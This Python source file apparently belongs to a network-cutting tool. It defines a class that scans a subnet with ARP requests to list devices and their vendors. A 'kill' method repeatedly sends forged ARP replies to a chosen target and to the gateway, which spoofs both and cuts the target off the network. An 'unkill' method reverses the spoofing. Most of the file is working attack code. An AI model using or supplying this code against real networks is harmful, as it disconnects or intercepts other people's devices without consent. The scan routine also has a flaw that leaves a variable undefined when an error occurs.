from scapy.sendrecv import srp
from scapy.layers.l2 import ARP, Ether
from manuf import manuf
from scapy.all import send
import time
import multiprocessing
from multiprocessing import Manager


class ScapyOperations:

    def __init__(self):
        self.dead = multiprocessing.Manager().dict()

    def arp_scan(self, ip):
        """
        Performs a network scan by sending ARP requests to an IP address or a range of IP addresses.
        Args:
            ip (str): An IP address or IP address range to scan. For example:
                        - 192.168.1.1 to scan a single IP address
                        - 192.168.1.1/24 to scan a range of IP addresses.
        Returns:
            A list of dictionaries mapping IP addresses to MAC addresses. For example:
            [
                {'IP': '192.168.2.1', 'MAC': 'c4:93:d9:8b:3e:5a'}
            ]
        """
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        try:
            ans, unans = srp(request, timeout=2, retry=1)
        except ValueError:
            pass

        scanned_users = {}
        result2 = []
        p = manuf.MacParser(update=True)
        for sent, received in ans:
            scanned_users[received.psrc] = {'MAC': received.hwsrc.upper(), 'Vendor': str(p.get_manuf(received.hwsrc))}
            temp = (received.psrc, received.hwsrc.upper(), str(p.get_manuf(received.hwsrc)))
            result2.append(temp)

        for received in unans:
            if received.psrc not in scanned_users:
                scanned_users[received.psrc] = {'MAC': received.hwsrc.upper(), 'Vendor': str(p.get_manuf(received.hwsrc))}
                temp = (received.psrc, received.hwsrc.upper(), str(p.get_manuf(received.hwsrc)))
                result2.append(temp)

        return result2

    def kill(self, source, target_mac, target_ip, wait_after=1):
        """
        Spoofing target
        """
        # Cheat target
        to_target = ARP(
            op=2,
            psrc=source[0],
            hwdst=target_mac,
            pdst=target_ip
        )

        # Cheat source
        to_source = ARP(
            op=2,
            psrc=target_ip,
            hwdst=source[1],
            pdst=source[0]
        )

        if target_ip not in self.dead:
            self.dead[target_ip] = target_mac
            print(self.dead)
            while target_ip in self.dead:
                # Send packets to both target and source
                send(to_target, verbose=0)
                send(to_source, verbose=0)
                time.sleep(wait_after)
        print("unkilled1")
    

    def unkill(self, source, target_mac, target_ip):
        """
        Unspoofing target
        """
        print(self.dead)
        if target_ip in self.dead:
            self.dead.pop(target_ip)

        # Fix target
        to_target = ARP(
            op=1,
            psrc=source[0],
            hwsrc=source[1],
            pdst=target_ip,
            hwdst=target_mac
        )

        # Fix Router
        to_router = ARP(
            op=1,
            psrc=target_ip,
            hwsrc=target_mac,
            pdst=source[0],
            hwdst=source[1]
        )

        # Send packets to both target and router
        send(to_target, verbose=0)
        send(to_router, verbose=0)
        print("unkilled2")
